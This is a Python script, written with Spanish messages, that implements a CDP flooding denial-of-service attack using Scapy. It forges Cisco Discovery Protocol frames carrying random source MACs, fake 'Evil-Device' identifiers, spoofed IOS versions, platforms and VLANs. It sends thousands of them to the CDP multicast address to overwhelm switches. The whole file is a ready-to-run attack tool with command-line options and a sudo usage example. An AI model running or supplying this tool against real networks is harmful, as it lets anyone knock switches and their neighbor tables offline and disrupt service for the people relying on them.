#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import time
import argparse
import random
import string
import struct
from socket import inet_aton

try:
    from scapy.all import *
    from scapy.layers.l2 import Ether, LLC, SNAP
except ImportError:
    print("[!] Error: Scapy no está instalada.")
    print("[!] Instalar: pip3 install scapy")
    sys.exit(1)

CDP_DESTINATION = "01:00:0c:cc:cc:cc"
CDP_SNAP_PID = 0x2000

class TLV(Packet):
    name = "CDP TLV"
    fields_desc = [
        ShortField("type", 0),
        ShortField("len", None),
        StrLenField("value", "", length_from=lambda pkt: pkt.len - 4)
    ]

    def post_build(self, p, pay):
        if self.len is None:
            p = p[:2] + struct.pack("!H", len(p)) + p[4:]
        return p + pay

class CDP(Packet):
    name = "CDP"
    fields_desc = [
        ByteField("version", 1),
        ByteField("ttl", 180),
        XShortField("chksum", None)
    ]

    def post_build(self, p, pay):
        if self.chksum is None:
            chksum = checksum(p + pay)
            p = p[:2] + struct.pack("!H", chksum) + p[4:]
        return p + pay

def generate_random_mac():
    return "00:1c:7f:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def build_cdp_packet():
    src_mac = generate_random_mac()
    ether = Ether(dst=CDP_DESTINATION, src=src_mac)
    llc = LLC(dsap=0xAA, ssap=0xAA, ctrl=0x03)
    snap = SNAP(OUI=0x00000C, code=CDP_SNAP_PID)
    device_id = f"Evil-Device-{random_string(8)}"
    port_id = f"Port{random.randint(1, 48)}/1"
    capabilities = random.choice([0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x01 | 0x02])
    version = f"Cisco IOS Software, Version {random.randint(15, 17)}.{random.randint(0, 9)}.{random.randint(1, 200)}"
    platform = random.choice(["cisco Catalyst 9000", "cisco ISR4400", "cisco ASR1000"])
    native_vlan = random.randint(1, 4094)
    random_ip = f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"
    ip_bytes = inet_aton(random_ip)
    tlv_list = [
        TLV(type=0x0001, value=device_id),
        TLV(type=0x0002, value=bytes([0x01, 0x01, 0x01]) + ip_bytes),
        TLV(type=0x0003, value=port_id),
        TLV(type=0x0004, value=struct.pack("!I", capabilities)),
        TLV(type=0x0005, value=version),
        TLV(type=0x0006, value=platform),
        TLV(type=0x000a, value=struct.pack("!H", native_vlan)),
    ]
    cdp_data = b"".join(bytes(tlv) for tlv in tlv_list)
    cdp_hdr = CDP()
    packet = ether / llc / snap / cdp_hdr / cdp_data
    return packet

def cdp_flood_attack(interface, count, delay):
    print(f"[+] Iniciando ataque CDP DoS en: {interface}")
    print(f"[+] Enviando {count} paquetes con retraso: {delay}s")
    print("[+] Ctrl+C para detener.\n")
    try:
        for i in range(count):
            packet = build_cdp_packet()
            sendp(packet, iface=interface, verbose=0)
            sys.stdout.write(f"\r[+] Paquetes: {i+1}/{count}")
            sys.stdout.flush()
            if delay > 0:
                time.sleep(delay)
        print("\n[+] Ataque completado.")
    except KeyboardInterrupt:
        print("\n\n[!] Detenido por usuario.")
    except Exception as e:
        print(f"\n[!] Error: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="Ataque DoS mediante inundación CDP con Scapy.",
        epilog="Uso: sudo python3 cdp_dos.py -i eth0 -c 10000 -d 0.001"
    )
    parser.add_argument("-i", "--interface", default="eth0", help="Interfaz de red (default: eth0).")
    parser.add_argument("-c", "--count", type=int, default=10000, help="Número de paquetes (default: 10000).")
    parser.add_argument("-d", "--delay", type=float, default=0.001, help="Retraso entre paquetes en segundos (default: 0.001).")
    args = parser.parse_args()
    if args.count <= 0:
        print("[!] El número de paquetes debe ser > 0.")
        sys.exit(1)
    if args.delay < 0:
        print("[!] El retraso no puede ser negativo.")
        sys.exit(1)
    cdp_flood_attack(args.interface, args.count, args.delay)

if __name__ == "__main__":
    main()